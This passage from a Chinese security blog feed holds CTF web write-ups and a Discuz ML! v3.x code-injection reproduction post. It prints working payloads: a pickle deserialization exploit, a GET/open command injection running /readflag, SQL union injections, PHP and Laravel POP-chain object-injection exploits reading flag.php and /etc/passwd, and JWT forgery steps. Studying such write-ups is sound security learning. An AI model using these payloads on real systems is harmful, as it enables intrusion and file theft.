class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">    response = request.urlopen(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> response.read().decode(<span class="string">'utf-8'</span>):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p>然后找到在第181页</p><p><img src="https://i.loli.net/2019/07/21/5d3452295efe843940.png" alt="181"></p><p>然后购买，发现lv6很贵，买不起，但是审查元素的时候发现折扣和价格是以<code>post</code>的形式传参的，直接修改即可。</p><p><img src="https://i.loli.net/2019/07/21/5d34536f7a3e626738.png" alt="买买买"></p><p>然后跳转到<code>b1g_m4mber</code>页面，提示只有<code>admin</code>可以访问，这里先尝试XFF未果，然后将目标转向<code>cookie</code>里的<code>JWT</code>字段。</p><p><img src="https://i.loli.net/2019/07/21/5d34547d392b915979.png" alt="JWT"></p><p>JWT简介：JWT（json web token）是目前最流行的跨域身份验证解决方案。JWT结构会改对象为一个很长的字符串，字符之间通过”.”分隔符分为三个子串。每一个子串表示了一个功能块，<strong>总共有以下三个部分：JWT头、有效载荷和签名。其中签名通常需要指定一个密码</strong>。经过查阅资料以后了解到是一个储存在客户端的令牌，会不会是这里限制了我们的身份呢？我们把抓取到的<code>jwt</code>字段解码一下：</p><p><img src="https://i.loli.net/2019/07/21/5d34566e7bad470883.png" alt="jwt解码"></p><p>果然这里是我们自己的用户名，直接改成”admin”的话签名肯定是不对的，我们还需要知道加密密钥。</p><p>这里用<code>Github</code>上的一个工具破解出密钥：</p><p><img src="https://i.loli.net/2019/07/21/5d345adede26213947.png" alt="1Kun"></p><p>填入密钥，修改<code>username</code>为<code>admin</code>，加密得到<code>JWT</code>，替换原字段值即可以<code>admin</code>访问。</p><p>审查元素发现给出源码，<code>python web</code>蒟蒻一枚的我，只能看dalao的writeup，发现是python 反序列化，主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become)) <span class="comment"># 反序列化</span></span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>我们发现<code>p</code>可以像’This is Black Technoloy!’一样打印在页面上，所以我们需要想办法让<code>p</code>里有flag，也就是become的传参是我们payload的输入点。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p>将构造好的<code>payload</code>传入become，即可获得flag。</p><p><img src="https://i.loli.net/2019/07/21/5d345f3d1135535928.png" alt=""></p><h2 id="0x09-ASIS-2019-Unicorn-shop"><a href="#0x09-ASIS-2019-Unicorn-shop" class="headerlink" title="0x09 [ASIS 2019]Unicorn shop"></a>0x09 [ASIS 2019]Unicorn shop</h2><p><strong>考察点：Google Hacking、脑洞</strong></p><p>页面有一个表单，分别是<code>id</code>和<code>price</code>两个参数，审查元素发现hint：</p><p><img src="https://i.loli.net/2019/07/24/5d37c247563c480820.png" alt=""></p><p>这里扫了目录，也人工fuzz了一下<code>admin.password</code>路径，没有源码泄露，猜测<code>admin.password</code>是注入时提示的数据库名、表名之类的?</p><p>于是抓包手工测试两个参数，发现<code>price</code>只能输入一个字符:</p><p><img src="https://i.loli.net/2019/07/24/5d37c38dcd78c77953.png" alt=""></p><p>然后思路就断了，google一下，发现是unicode编码问题，我们要做的就是用一个字符买到超独角兽：</p><p><img src="https://i.loli.net/2019/07/24/5d37c57e3fe4c88786.png" alt=""></p><p>详情参考：<a href="https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis" target="_blank" rel="noopener">unicorn shop</a> (Github上的，不用fq</p><p>这个脑洞也就忍了，之前看到过，但是这几个蜜汁提示到底是什么意思？</p><p><img src="https://i.loli.net/2019/07/24/5d37c6799388786042.png" alt=""></p><p><strong>google hacking很重要= =</strong></p><h2 id="0x0A-De1CTF-2019-SSRFme"><a href="#0x0A-De1CTF-2019-SSRFme" class="headerlink" title="0x0A [De1CTF 2019]SSRFme"></a>0x0A [De1CTF 2019]SSRFme</h2><p><strong>考察点：代码审计，GET命令漏洞</strong></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;  <span class="comment">//XFF</span></span><br><span class="line">      $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大致意思是以GET方式获取两个参数<code>url</code>和<code>filename</code>，先创建一个沙盒，然后<code>url</code>与GET拼接执行命令；执行结果写入到<code>filename</code>中。</p><p>一直卡在拼接<code>GET</code>到底是要干什么，是要绕过还是什么；后面看wp发现它也是一条命令，而且还能够导致命令执行。</p><p><strong>GET命令漏洞：</strong></p><p>GET命令底层是perl中的open实现的，而open是可以执行命令的，并且还支持file协议。</p><p>所以我们的思路就是创建一个可以执行命令的文件名，然后用file协议读取文件。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash%<span class="number">20</span>-c%<span class="number">20</span>/readflag|&amp;filename=test  <span class="comment">// 创建文件</span></span><br><span class="line">/sandbox/<span class="number">2658</span>dbe3e5584a4654488ea0500255cc/test  <span class="comment">//hash值为 md5('orange'+'your_ip')</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/24/5d384394adf6594677.png" alt=""></p><p>另外还有反弹shell的思路，有时间再补上吧= =</p><h2 id="0x0B-fakebook"><a href="#0x0B-fakebook" class="headerlink" title="0x0B fakebook"></a>0x0B fakebook</h2><p><strong>考察点：SQLI + SSRF、反序列化</strong></p><p>网鼎杯的一道原题</p><p>先注册一个账号，四处点一点，发现存在注入点：<code>/view.php?no=1</code></p><p>爆表名、列名、列值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">no=0 order by 1,2,3,4,5  <span class="comment">/*4列*/</span></span><br><span class="line">no=0 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  <span class="comment">/*users*/</span></span><br><span class="line"><span class="keyword">no</span>=<span class="number">0</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">/*no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS */</span></span><br><span class="line"><span class="keyword">no</span>=<span class="number">0</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">data</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">users</span>  <span class="comment">/*序列化字符串*/</span></span><br></pre></td></tr></table></figure><p>观察一下这个序列化的字符串，是一个有姓名，年龄，博客的对象：</p><p><img src="https://i.loli.net/2019/07/26/5d3a6cbdb720d25456.png" alt=""></p><p>前面我们注意到users表是有四列的，最后一列是<code>blog contents</code>，审查元素发现有一个base64编码，根据经验flag可能从这里出。</p><p>扫描目录，发现<code>robots.txt</code>存在源码泄露，是<code>users.php</code>，审计一下发现存在<code>SSRF</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init(); <span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);  <span class="comment">//设置需要抓取的url</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);  <span class="comment">//结果保留到字符串</span></span><br><span class="line">        $output = curl_exec($ch);  <span class="comment">//运行url，结果保存至 $output</span></span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;  <span class="comment">//返回url执行结果</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog <span class="comment">//url执行结果显示在 blog contents 下</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);  <span class="comment">//过滤</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们的思路就比较明确：<code>user.php</code>过滤了http协议，前面报错我们可以知道服务器的web绝对路径为<code>/var/www/html</code>，所以可以用file协议直接读取<code>flag.php</code>,构造查询语句时请求结果保存在<code>blog contents</code>中，即可读取flag</p><p>payload：<code>no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:12:&quot;sketch_pl4ne&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p><p><img src="https://i.loli.net/2019/07/26/5d3a718249fb384160.png" alt="flag"></p><p>flag到手~</p><h2 id="0x0C-CISCN-2019-laravel1"><a href="#0x0C-CISCN-2019-laravel1" class="headerlink" title="0x0C [CISCN 2019] laravel1"></a>0x0C [CISCN 2019] laravel1</h2><p><strong>考察点：laravel代码审计，反序列化</strong></p><p>laravel框架没了解过，也没审计过这么多文件，审计的时候也是一头雾水，写得不好还请见谅。</p><p>一开始提示了我们要用反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便把源码下载下来，然后开始审计。</p><p>既然是要反序列化，那我们先搜索一下魔法函数<code>__destruct()</code>：</p><p><img src="https://t1.picb.cc/uploads/2019/08/14/gNynfF.png" alt=""></p><p>发现有很多，这里貌似都是一个一个找的。。。 不过很多都是没有实现的空函数，我们一般会找有函数调用的地方，比如这个：</p><p><img src="https://t1.picb.cc/uploads/2019/08/14/gNyRC6.png" alt=""></p><p>然后跟进<code>commit()</code>看一下：</p><p><img src="https://t1.picb.cc/uploads/2019/08/14/gNyTsM.png" alt=""></p><p>继续跟进<code>invalidateTags()</code>：</p><p><img src="https://t1.picb.cc/uploads/2019/08/14/gNyLIt.png" alt=""></p><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">            $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">            <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">                    $ok = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>$this-&gt;pool</code>是AdapterInterface类的一个对象，并且调用了<code>saveDeferred()</code>方法，我们可以查找既实现了AdapterInterface接口，同时saveDeferred()函数又可以利用的类，比如<code>PhpArrayAdapter.php</code>：</p><p><img src="https://t1.picb.cc/uploads/2019/08/14/gNyDkJ.png" alt=""></p><p>跟进<code>initialize()</code>：</p><p><img src="https://t1.picb.cc/uploads/2019/08/14/gNyEH0.png" alt=""></p><p>发现存在文件包含，我们只需将<code>$this-&gt;file</code>重写为我们想读的文件即可。</p><p>这只是其中一个利用链，还有官方命令执行的做法可以看参考链接自行复现，下面是 <a href="https://www.cnblogs.com/wfzWebSecuity/" target="_blank" rel="noopener">tr1ple</a> 师傅的exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// saveDeferred()方法所需参数为该类的对象</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="comment">// 重写包含路径</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/etc/passwd'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 重写$this-&gt;pool对象，调用PhpArrayAdapter类的saveDeferred()方法</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'tr1ple'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/08/14/gNyYdd.png" alt=""></p><p><strong><em>flag到手</em></strong></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11263051.html" target="_blank" rel="noopener">CISCN final 几道题的总结  by tr1ple</a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>信安路上的小学生，努力做题ing : )</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;练习平台：&lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopen
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Discuz ML! V3.x 代码注入漏洞</title>
    <link href="https://www.sketchplane.top/2019/07/14/%C2%96Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.sketchplane.top/2019/07/14/%C2%96Discuz-ML-V3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-07-14T07:04:44.000Z</published>
    <updated>2019-07-14T08:35:01.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前在安全客上看到最近的爆出一个漏洞，属于危害较大，利用简单的类型；原理挺简单，关键是能不能发现的问题。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像”社交网络”这样的互联网社区。</p><p>2019年7月11日，Discuz！ML被发现存在一处<code>RCE</code>，主要是因为对cookie字段的处理不当，没有对其中的<code>language</code>字段进行过滤，导致攻击者通过精心构造的<code>payload</code>可以以拼接的方式向php缓存文件中写入恶意代码，达到远程代码执行。</p><p>首先，通过cookie传入payload，构造好的payload被写入template文件中:</p><p><img src="https://i.loli.net/2019/07/14/5d2adc29b47d329885.png" alt=""></p><p>接着，这个被插入payload的template.php文件被include，造成代码执行:</p><p><img src="https://i.loli.net/2019/07/14/5d2adc7962f6448661.png" alt=""></p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><ul><li>Discuz! ML v.3.4</li><li>Discuz! ML v.3.3</li><li>Discuz! ML v.3.2</li></ul><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>主要逻辑在漏洞描述说得比较清楚，详细的代码审计可以戳这：<a href="https://www.anquanke.com/post/id/181887#h2-1" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a></p><p>整个流程要仔细看一遍，其实逻辑很简单。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>官网下载：<a href="http://discuz.ml/download" target="_blank" rel="noopener">http://discuz.ml/download</a><br>解压之后将<code>upload</code>文件夹拷贝到web目录下， 浏览器访问安装即可。</p><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>从上面的漏洞分析可以看出，由于<code>$lng</code>参数可控，导致<code>$cachefile</code>部分可控，$cachefile又被拼接到<code>$headeradd</code>中，<code>$headeradd</code>又被带到<code>$template</code>中，而最后写入配置文件时就是写<code>$template</code>，导致代码注入。</p><h3 id="漏洞执行"><a href="#漏洞执行" class="headerlink" title="漏洞执行"></a>漏洞执行</h3><p>由上可知，凡是有template()方法的页面应该时都能注入的，这里我以首页(index.php)为例：</p><p>首先抓包：</p><p><img src="https://i.loli.net/2019/07/14/5d2adee5cc03782077.png" alt=""></p><p>然后构造payload：</p><p><img src="https://i.loli.net/2019/07/14/5d2adef25794f40978.png" alt=""></p><p>成功执行：</p><p><img src="https://i.loli.net/2019/07/14/5d2adf1fe82e325148.png" alt=""></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>这里参考<strong>米斯特安全团队</strong>给出的：</p><p>在<code>/source/class/discuz/discuz_application.php</code> 第338行之后341行之前加入该代码暂缓此安全问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$lng = str_replace(<span class="string">"("</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">")"</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">"'"</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">'"'</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">'`'</span>,<span class="string">""</span>,$lng);</span><br></pre></td></tr></table></figure><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://xz.aliyun.com/t/5638" target="_blank" rel="noopener">Discuz!ML V3.X 代码注入分析</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11180396.html" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞</a></p><p><a href="https://www.anquanke.com/post/id/181887#h2-1" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a></p><h2 id="小结"><a href="#小结" class="headerlink" 